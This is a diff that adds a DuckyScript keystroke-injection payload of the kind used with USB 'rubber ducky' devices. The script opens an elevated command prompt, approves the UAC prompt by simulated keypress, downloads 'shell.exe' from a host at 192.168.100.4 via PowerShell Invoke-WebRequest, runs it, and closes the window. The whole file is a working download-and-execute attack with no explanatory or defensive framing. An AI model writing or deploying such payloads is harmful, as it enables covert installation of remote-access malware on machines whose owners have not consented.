@@ -1,0 +1,19 @@
+DELAY 5000
+GUI r
+DELAY 1500
+STRING cmd
+CTRL-SHIFT ENTER
+DELAY 5000
+ALT y
+DELAY 3000
+STRING cd /d %TEMP%
+ENTER
+DELAY 1000
+STRING powershell -Command "Invoke-WebRequest -Uri 'http://192.168.100.4/shell.exe' -OutFile 'shell.exe'"
+ENTER
+DELAY 8000
+STRING shell.exe
+ENTER
+DELAY 5000
+STRING exit
+ENTER
